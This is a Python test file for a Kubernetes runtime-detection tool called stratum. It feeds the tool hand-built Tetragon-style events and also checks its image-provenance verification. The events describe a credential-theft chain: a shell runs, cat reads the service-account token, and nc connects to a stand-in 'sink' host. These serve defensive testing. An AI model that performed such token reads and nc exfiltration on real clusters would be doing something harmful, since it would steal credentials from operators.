"""stratum.live on hand-built Tetragon-shaped events (the real run is .github/workflows/live.yml)."""
import json
from pathlib import Path

from stratum.detect import rule_detect
from stratum.live import build_dataset, check
from stratum.models import RuntimeEvent

ROOT = Path(__file__).resolve().parents[1]
DIG = "sha256:" + "ab" * 32
REF = f"ghcr.io/rakshit-737/stratum-live-demo@{DIG}"


def _proc(binary, args="", pod="web-5d9c7b-x1"):
    return {"binary": binary, "arguments": args, "uid": 65534,
            "pod": {"namespace": "stratum-live", "name": pod,
                    "container": {"id": "containerd://c1", "image": {"id": REF, "name": REF}}}}


def _events():
    t = "2026-09-27T10:00:0{}.000000000Z"
    return [
        {"time": t.format(1), "process_exec": {"process": _proc("/bin/sh", "-c id")}},
        {"time": t.format(2), "process_kprobe": {"process": _proc("/bin/cat"), "function_name": "fd_install",
         "args": [{"int_arg": 3}, {"file_arg": {"path": "/var/run/secrets/kubernetes.io/serviceaccount/"
                                                        "..2026_09_27_10_00_00.1/token"}}]}},
        {"time": t.format(3), "process_exec": {"process": _proc("/bin/nc", "-w 3 sink 8080")}},
        {"time": t.format(4), "process_kprobe": {"process": _proc("/bin/nc"), "function_name": "tcp_connect",
         "args": [{"sock_arg": {"daddr": "10.96.12.3", "dport": 8080}}]}},
    ]


def test_projected_token_path_detected():
    e = RuntimeEvent(0, "p", "n", "open", "/bin/cat", path="/..2026_09_27_10_00_00.123/token")
    assert rule_detect(e).rule == "R-SA-TOKEN"


def test_live_check_end_to_end(tmp_path):
    man = tmp_path / "w.yaml"
    man.write_text((ROOT / "deploy/live/workloads.yaml").read_text().replace("IMAGE", REF))
    ev = tmp_path / "ev.json"
    ev.write_text("\n".join(json.dumps(x) for x in _events()))
    pods = tmp_path / "pods.json"
    pods.write_text(json.dumps({"items": [{"metadata": {"name": "web-5d9c7b-x1", "namespace": "stratum-live",
                                                        "ownerReferences": [{"kind": "ReplicaSet",
                                                                             "name": "web-5d9c7b"}]}}]}))
    ds = build_dataset([man], pods, [ev], image_ref=REF, commit="c0ffee", repo="r", signed=True)
    r = check(ds, namespace="stratum-live", workload="web", image_digest=DIG, commit="c0ffee",
              gatekeeper={"privileged_denied": True, "demo_admitted": True}, cosign_ok=True)
    assert r["passed"], r["failures"]
    assert r["example_chain"][-1] == "commit:c0ffee"
    r = check(ds, namespace="stratum-live", workload="web", image_digest=DIG, commit="other")
    assert not r["passed"]
